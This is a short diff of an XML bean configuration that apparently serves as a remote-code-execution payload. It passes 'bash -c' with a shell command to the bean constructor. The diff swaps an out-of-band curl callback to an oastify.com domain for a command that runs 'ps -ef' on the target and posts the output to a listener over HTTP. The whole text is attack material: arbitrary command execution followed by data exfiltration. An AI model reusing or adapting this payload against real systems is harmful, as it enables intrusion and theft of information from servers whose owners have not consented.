@@ -4,7 +4,7 @@
           <list>
             <value>bash</value>
             <value>-c</value>
-            <value>curl https://v1xzl2izr6u5qq2w9zlocu6i69c00uoj.oastify.com/test</value>
+            <value>ps -ef | curl -X POST -d @- http://127.0.0.1:88/1</value>
           </list>
         </constructor-arg>
     </bean>
